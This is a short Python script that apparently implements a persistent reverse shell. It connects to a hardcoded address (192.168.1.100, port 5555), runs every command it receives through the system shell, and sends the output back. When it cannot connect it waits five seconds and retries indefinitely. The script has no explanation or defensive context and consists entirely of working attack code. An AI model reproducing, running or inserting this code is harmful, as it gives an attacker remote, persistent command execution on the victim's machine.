import socket
import subprocess
import os
import time

HOST = '192.168.1.100'
PORT = 5555

while True:
    try:
        s = socket.socket()
        s.connect((HOST, PORT))
        while True:
            cmd = s.recv(1024).decode()
            if not cmd:
                break
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            s.send((result.stdout + result.stderr).encode())
    except:
        time.sleep(5)